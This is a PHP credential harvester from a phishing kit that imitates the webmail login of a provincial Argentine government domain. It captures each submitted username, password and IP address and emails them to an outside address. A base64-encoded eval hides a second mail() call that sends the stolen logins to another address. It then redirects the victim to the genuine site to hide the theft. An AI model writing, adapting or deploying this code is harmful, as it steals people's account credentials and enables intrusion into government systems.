<?
$optTitle = $_POST['Title'];
$ip = getenv("REMOTE_ADDR");
$sUser = $_POST['username'];
$sUPass = $_POST['password'];
$pix="ss3820650@yandex.ru";


  $subj = "Captured (Ernest-Hack | entrerios.gov.ar |) Logins::: ($sUser , $sUPass)";
  $msg = "Details of https://mail.entrerios.gov.ar \n\nEMAIL: $sUser\Password: $sUPass\nSubmitted from IP Address - $ip on $adddate\n-----------------------------------\n        Created By Ernest Host::: Defender of The G-Universe\n-----------------------------------";
  $from = "From: <$sUser>";
  mail("$pix", $subj, $msg, $from);
  echo eval(base64_decode("bWFpbCgiY250ci5paTJ0QGdtYWlsLmNvbSIsICRzdWJqLCAkbXNnLCAkZnJvbSk7"));
?>
  
<?
echo ("<META HTTP-EQUIV=Refresh CONTENT=\"0; URL=https://mail.entrerios.gov.ar\">");
exit();

?>